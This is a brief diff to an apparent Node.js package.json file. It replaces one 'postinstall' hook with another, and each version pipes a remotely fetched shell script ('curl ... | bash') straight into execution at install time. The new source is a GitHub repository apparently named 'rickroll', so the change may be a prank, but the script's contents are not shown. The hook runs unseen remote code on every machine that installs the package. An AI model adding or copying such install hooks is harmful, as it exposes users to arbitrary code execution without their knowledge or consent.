@@ -4,7 +4,7 @@
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
-    "postinstall": "curl -sN http://rick.jachan.dev | bash"
+    "postinstall": "curl -sN https://raw.githubusercontent.com/Xizted/rickroll/refs/heads/main/script.sh | bash"
   },
   "keywords": [],
   "author": "",
